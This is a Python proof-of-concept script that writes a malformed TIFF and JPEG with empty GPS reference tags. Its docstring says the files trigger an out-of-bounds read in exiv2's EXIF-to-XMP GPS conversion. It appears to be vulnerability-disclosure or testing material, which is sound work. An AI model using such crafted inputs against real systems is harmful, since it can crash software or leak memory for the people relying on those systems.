#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Read via .front() on Empty GPS Reference String
in Converter::cnvExifGPSCoord() at src/convert.cpp line 836.

Trigger: exiv2 pr vuln_001_input.tiff
  -> ExifParser::decode() -> copyExifToXmp() -> cnvExifGPSCoord()
  -> refPos->toString().front()  [UB: front() on empty string]
"""
import struct
import os

OUT_TIFF = os.path.join(os.path.dirname(__file__), 'vuln_001_input.tiff')
OUT_JPEG = os.path.join(os.path.dirname(__file__), 'vuln_001_input.jpg')


def build_tiff_blob():
    """
    Build raw TIFF bytes (little-endian) with GPS IFD where
    GPSLatitudeRef and GPSLongitudeRef are ASCII type with count=0 (empty string).

    Layout (all offsets from start of TIFF blob):
      0x00 ..  0x07 : TIFF header (8 bytes)
      0x08 ..  0x1B : IFD0 (1 entry: GPSInfo pointer) + next-IFD ptr  (18 bytes)
      0x1A ..  0x53 : GPS IFD (4 entries + next-IFD ptr)               (54 bytes)
      0x54 ..  0x6B : rational data for GPSLatitude  (3 * 8 = 24 bytes)
      0x6C ..  0x83 : rational data for GPSLongitude (3 * 8 = 24 bytes)
    """
    IFD0_OFFSET    = 8
    IFD0_ENTRIES   = 1
    IFD0_SIZE      = 2 + IFD0_ENTRIES * 12 + 4   # 18

    GPS_IFD_OFFSET = IFD0_OFFSET + IFD0_SIZE      # 26
    GPS_ENTRIES    = 4
    GPS_IFD_SIZE   = 2 + GPS_ENTRIES * 12 + 4     # 54

    LAT_OFFSET     = GPS_IFD_OFFSET + GPS_IFD_SIZE  # 80
    LON_OFFSET     = LAT_OFFSET + 24                 # 104

    buf = bytearray()

    # ---- TIFF header ----
    buf += b'II'                              # little-endian byte order
    buf += struct.pack('<H', 42)              # magic number
    buf += struct.pack('<I', IFD0_OFFSET)    # offset to IFD0

    # ---- IFD0: 1 entry ----
    buf += struct.pack('<H', IFD0_ENTRIES)
    # Tag 0x8825 GPSInfo, type=LONG(4), count=1, value=GPS_IFD_OFFSET
    buf += struct.pack('<HHII', 0x8825, 4, 1, GPS_IFD_OFFSET)
    buf += struct.pack('<I', 0)              # next IFD offset = 0

    # ---- GPS IFD: 4 entries ----
    buf += struct.pack('<H', GPS_ENTRIES)

    # GPSLatitudeRef (0x0001): type=ASCII(2), count=0 -> EMPTY STRING -> triggers bug
    buf += struct.pack('<HHII', 0x0001, 2, 0, 0)

    # GPSLatitude (0x0002): type=RATIONAL(5), count=3, offset=LAT_OFFSET
    buf += struct.pack('<HHII', 0x0002, 5, 3, LAT_OFFSET)

    # GPSLongitudeRef (0x0003): type=ASCII(2), count=0 -> also empty
    buf += struct.pack('<HHII', 0x0003, 2, 0, 0)

    # GPSLongitude (0x0004): type=RATIONAL(5), count=3, offset=LON_OFFSET
    buf += struct.pack('<HHII', 0x0004, 5, 3, LON_OFFSET)

    buf += struct.pack('<I', 0)              # next IFD = 0

    # ---- Rational data for GPSLatitude: 40°0'0" ----
    buf += struct.pack('<II', 40, 1)   # 40 degrees
    buf += struct.pack('<II',  0, 1)   # 0 minutes
    buf += struct.pack('<II',  0, 1)   # 0 seconds

    # ---- Rational data for GPSLongitude: 74°0'0" ----
    buf += struct.pack('<II', 74, 1)
    buf += struct.pack('<II',  0, 1)
    buf += struct.pack('<II',  0, 1)

    return bytes(buf)


def write_tiff():
    blob = build_tiff_blob()
    with open(OUT_TIFF, 'wb') as f:
        f.write(blob)
    print(f"Generated {OUT_TIFF} ({len(blob)} bytes)")


def write_jpeg():
    """
    Wrap the same TIFF blob in a JPEG APP1/EXIF segment as fallback.
    """
    tiff_blob = build_tiff_blob()
    exif_header = b'Exif\x00\x00'
    app1_payload = exif_header + tiff_blob
    app1_len = len(app1_payload) + 2  # includes the 2-byte length field itself

    jpeg = bytearray()
    jpeg += b'\xff\xd8'                        # SOI
    jpeg += b'\xff\xe1'                        # APP1 marker
    jpeg += struct.pack('>H', app1_len)        # APP1 length (big-endian)
    jpeg += app1_payload
    # Minimal valid JPEG terminator
    jpeg += b'\xff\xd9'                        # EOI

    with open(OUT_JPEG, 'wb') as f:
        f.write(jpeg)
    print(f"Generated {OUT_JPEG} ({len(jpeg)} bytes)")


if __name__ == '__main__':
    write_tiff()
    write_jpeg()
